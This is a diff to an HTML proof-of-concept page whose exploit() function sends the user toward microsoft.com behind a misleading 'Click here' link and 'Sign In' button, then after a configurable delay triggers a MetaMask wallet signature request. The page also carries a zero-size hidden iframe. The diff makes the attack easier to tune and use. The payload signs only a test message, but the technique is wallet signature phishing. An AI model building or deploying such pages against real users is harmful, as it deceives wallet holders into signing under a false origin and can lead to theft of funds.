@@ -1,8 +1,7 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-  <title>HTML Elements Reference</title>
+  <title>HTML Elements Reference with Timeout Input</title>
 </head>
 <body>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
@@ -13,49 +12,81 @@
         try {
           await window.ethereum.request({ method: "eth_requestAccounts" });
           window.web3 = new Web3(window.ethereum);
-          const account = web3.eth.accounts;
-          const walletAddress = account.givenProvider.selectedAddress;
+          // Note: web3.eth.accounts might be deprecated depending on version/context.
+          // Requesting accounts above is the more modern way. Getting selectedAddress might require specific provider properties.
+          const accounts = await window.web3.eth.getAccounts();
+          const walletAddress = accounts[0]; // Typically the first account is the selected one
 
           if (walletAddress) {
             const message = "This is a test message for signing.";
-            const signature = await web3.eth.personal.sign(message, walletAddress);
-            console.log(`Wallet: ${walletAddress}`);
+            console.log(`Attempting to sign message from Wallet: ${walletAddress}`);
+            const signature = await web3.eth.personal.sign(message, walletAddress, ""); // Added empty string for password field if needed by older clients
             console.log(`Message: ${message}`);
             console.log(`Signature: ${signature}`);
+            alert(`Signed message from ${walletAddress}. Signature: ${signature}`); // Added alert for visibility
           } else {
-            console.log("No wallet connected");
+            console.log("No wallet connected or account selected");
+            alert("No wallet connected or account selected.");
           }
         } catch (error) {
           console.error("Error signing message:", error);
+          alert(`Error signing message: ${error.message}`);
         }
       } else {
-        console.log("No wallet detected");
+        console.log("MetaMask or compatible wallet not detected");
+        alert("MetaMask or compatible wallet not detected. Please install it.");
       }
     }
 
     function exploit() {
-      // // Navigate to Microsoft.com
-       window.location.href = "https://microsoft.com";
+      // Get the timeout value from the input field
+      const timeoutInput = document.getElementById('timeoutInput');
+      let timeoutValue = parseInt(timeoutInput.value, 10); // Parse as base-10 integer
 
-      // // Run the signMessage function 2 seconds after navigation starts
+      // Validate the timeout value or set a default
+      if (isNaN(timeoutValue) || timeoutValue < 0) {
+        console.warn(`Invalid timeout value entered (${timeoutInput.value}). Using default: 5000ms`);
+        timeoutValue = 5000; // Use a default value
+        // Optionally update the input field to show the default being used
+        // timeoutInput.value = timeoutValue;
+      }
+
+      console.log(`Navigating to Microsoft.com and attempting signMessage after ${timeoutValue}ms`);
+
+      // --- IMPORTANT CAVEAT ---
+      // Initiating navigation immediately might prevent the setTimeout code from running reliably.
+      // The browser may unload the current page context before the timer fires.
+      // Consider signing *before* navigating if that's the required sequence.
+      // ------------------------
+
+      // Navigate to Microsoft.com
+      window.location.href = "https://microsoft.com";
+
+      // Run the signMessage function after the specified delay
       setTimeout(() => {
         try {
+          // This code block might not execute if the navigation happens too quickly.
+          console.log(`Executing signMessage after ${timeoutValue}ms delay (may fail due to navigation)`);
           signMessage();
         } catch (error) {
-          console.error("Error executing signMessage:", error);
+          console.error("Error executing signMessage after timeout:", error);
         }
-      }, 5000); // Delay for 2 seconds
+      }, timeoutValue); // Use the dynamic timeout value
     }
   </script>
 
+  <label for="timeoutInput">Timeout before signing (ms): </label>
+  <input type="number" id="timeoutInput" value="5000" min="0">
+
   <br><br><br><br>
 
-  <a href="#" onclick="exploit();">
-    <center><h1>Click here to go to https://microsoft.com</h1></center>
+  <a href="#" onclick="exploit(); return false;"> <center><h1>Click here to go to https://microsoft.com (and sign after delay)</h1></center>
   </a>
 
-  <input type="button" value="Sign In" onclick="exploit();" />
+  <br><br>
 
-  <iframe frameborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+  <input type="button" value="Sign In and Redirect (after delay)" onclick="exploit();" />
+
+  <iframe frameborder="0" style="width:0;height:0;border:0;" id="iframe" src=""></iframe>
 </body>
 </html>
